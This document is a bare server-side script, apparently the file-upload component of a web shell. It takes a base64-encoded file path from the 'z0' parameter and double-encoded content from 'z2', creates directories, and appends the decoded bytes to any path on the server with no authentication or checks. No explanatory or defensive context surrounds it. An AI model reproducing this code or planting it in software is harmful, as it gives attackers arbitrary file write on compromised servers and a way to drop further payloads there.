<%

function base64DecodeToString(b64Str) {
    if (b64Str == null || b64Str == "")
        return "";
    try {
        var clean = b64Str.replace(/ /g, "+");
        var decodedBytes = java.util.Base64.getDecoder().decode(clean);
        
        return new java.lang.String(decodedBytes, "UTF-8");
    } catch(e) {
        return "";
    }
}

var paramMap = request.getParameterMap();
var szFilePath = "";
var data = "";

if (paramMap.containsKey("z0")) {
    szFilePath = base64DecodeToString(paramMap.get("z0")[0]);
}

if (paramMap.containsKey("z2")) {
    data = paramMap.get("z2")[0];
}

if (szFilePath == "") {
    echo("0");
} else {
    try {
        var path = java.nio.file.Paths.get(szFilePath);
        var parentDir = path.getParent();

        if (parentDir != null && !java.nio.file.Files.exists(parentDir)) {
            java.nio.file.Files.createDirectories(parentDir);
        }

        var szb64Data = base64DecodeToString(data);
        var c = szb64Data.replace(/\r/g, "").replace(/\n/g, "");

        if (c == "") {
            echo("0");
        } else {
            var buf = java.util.Base64.getDecoder().decode(c);

            java.nio.file.Files.write(
                path, 
                buf, 
                [
                    java.nio.file.StandardOpenOption.CREATE, 
                    java.nio.file.StandardOpenOption.APPEND
                ]
            );

            echo("1");
        }

    } catch (e) {
        echo("0");
    }
}

%>